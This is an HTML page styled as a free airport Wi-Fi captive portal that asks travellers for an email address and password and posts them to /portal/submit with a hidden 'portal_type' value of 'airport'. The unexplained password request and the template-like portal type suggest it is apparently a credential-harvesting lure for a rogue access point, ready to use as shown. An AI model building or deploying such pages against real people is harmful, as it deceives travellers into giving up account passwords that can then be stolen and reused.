<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Free WiFi — Airport Login</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
         background: linear-gradient(160deg, #0b2745 0%, #124a7a 100%); min-height: 100vh;
         display: flex; align-items: center; justify-content: center; padding: 16px; }
  .card { background: #ffffff; border-radius: 16px; padding: 34px 28px; width: 100%; max-width: 410px;
          box-shadow: 0 24px 60px rgba(0, 0, 0, 0.35); }
  .tag { display: inline-block; background: #e8f1fb; color: #124a7a; font-size: 0.7rem;
         letter-spacing: 0.12em; text-transform: uppercase; font-weight: 700;
         padding: 6px 10px; border-radius: 999px; margin-bottom: 14px; }
  h1 { font-size: 1.35rem; color: #0b2745; margin-bottom: 6px; }
  p { color: #5c6b7a; font-size: 0.88rem; line-height: 1.5; margin-bottom: 22px; }
  .field { margin-bottom: 14px; }
  label { display: block; font-size: 0.8rem; color: #33485e; margin-bottom: 6px; font-weight: 600; }
  input { width: 100%; padding: 13px 14px; border: 1px solid #cfdbe6; border-radius: 10px;
          font-size: 1rem; outline: none; background: #f9fbfd; }
  input:focus { border-color: #124a7a; background: #fff; }
  button { width: 100%; padding: 14px; background: #124a7a; color: #fff; border: none;
           border-radius: 10px; font-size: 1rem; font-weight: 700; cursor: pointer; margin-top: 6px; }
  .footer { text-align: center; margin-top: 18px; font-size: 0.72rem; color: #8a99a8; }
</style>
</head>
<body>
<div class="card">
  <div class="tag">Terminal Wi-Fi</div>
  <h1>Gate to the internet</h1>
  <p>Connect your device for free terminal Wi-Fi. Your session lasts until you leave the terminal.</p>
  <form method="POST" action="/portal/submit">
    <input type="hidden" name="portal_type" value="airport">
    <div class="field">
      <label for="email">Email address</label>
      <input type="email" id="email" name="email" placeholder="you@example.com" required>
    </div>
    <div class="field">
      <label for="password">Password</label>
      <input type="password" id="password" name="password" placeholder="Enter password" required>
    </div>
    <button type="submit">Start free session</button>
  </form>
  <div class="footer">By connecting you agree to the terminal network terms of use.</div>
</div>
</body>
</html>
